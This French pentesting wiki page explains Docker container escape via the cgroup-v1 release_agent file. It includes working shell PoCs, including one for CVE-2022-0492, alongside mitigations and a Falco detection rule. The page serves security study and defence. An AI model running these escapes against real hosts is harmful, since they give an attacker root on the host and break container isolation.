# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Pour plus de détails, référez-vous au** [**post de blog original**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Ceci est juste un résumé :

---

## PoC classique (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Le PoC abuse de la fonctionnalité **cgroup-v1** `release_agent` : lorsque la dernière tâche d'un cgroup ayant `notify_on_release=1` se termine, le noyau (dans les **espaces de noms initiaux sur l'hôte**) exécute le programme dont le chemin est stocké dans le fichier writable `release_agent`. Étant donné que cette exécution se fait avec **des privilèges root complets sur l'hôte**, obtenir un accès en écriture au fichier suffit pour une évasion de conteneur.

### Bref aperçu lisible

1. **Préparer un nouveau cgroup**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # ou –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Pointer `release_agent` vers un script contrôlé par l'attaquant sur l'hôte**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Déposer le payload**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Déclencher le notifier**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # s'ajouter et sortir immédiatement
cat /output                                  # contient maintenant les processus de l'hôte
```

---

## Vulnérabilité du noyau 2022 – CVE-2022-0492

En février 2022, Yiqi Sun et Kevin Wang ont découvert que **le noyau ne vérifiait *pas* les capacités lorsqu'un processus écrivait dans `release_agent` dans cgroup-v1** (fonction `cgroup_release_agent_write`).

Effectivement, **tout processus capable de monter une hiérarchie cgroup (par exemple via `unshare -UrC`) pouvait écrire un chemin arbitraire dans `release_agent` sans `CAP_SYS_ADMIN` dans l'espace de noms utilisateur *initial***. Sur un conteneur Docker/Kubernetes exécuté en tant que root avec une configuration par défaut, cela permettait :

* une élévation de privilèges vers root sur l'hôte ; ↗
* une évasion de conteneur sans que le conteneur soit privilégié.

Le défaut a été attribué à **CVE-2022-0492** (CVSS 7.8 / Élevé) et corrigé dans les versions de noyau suivantes (et toutes les versions ultérieures) :

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Commit de patch : `1e85af15da28 "cgroup: Fix permission checking"`.

### Exploit minimal à l'intérieur d'un conteneur
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Si le noyau est vulnérable, le binaire busybox du *hôte* s'exécute avec un accès root complet.

### Durcissement & Atténuations

* **Mettre à jour le noyau** (≥ versions supérieures). Le correctif nécessite maintenant `CAP_SYS_ADMIN` dans le *namespace* utilisateur *initial* pour écrire dans `release_agent`.
* **Préférer cgroup-v2** – la hiérarchie unifiée **a complètement supprimé la fonctionnalité `release_agent`**, éliminant cette classe d'évasions.
* **Désactiver les namespaces utilisateurs non privilégiés** sur les hôtes qui n'en ont pas besoin :
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Contrôle d'accès obligatoire** : Les politiques AppArmor/SELinux qui interdisent `mount`, `openat` sur `/sys/fs/cgroup/**/release_agent`, ou qui suppriment `CAP_SYS_ADMIN`, arrêtent la technique même sur des noyaux vulnérables.
* **Masque de liaison en lecture seule** pour tous les fichiers `release_agent` (exemple de script Palo Alto) :
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Détection à l'exécution

[`Falco`](https://falco.org/) expédie une règle intégrée depuis la v0.32 :
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
La règle se déclenche lors de toute tentative d'écriture sur `*/release_agent` depuis un processus à l'intérieur d'un conteneur qui détient encore `CAP_SYS_ADMIN`.

## Références

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – analyse détaillée et script d'atténuation.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
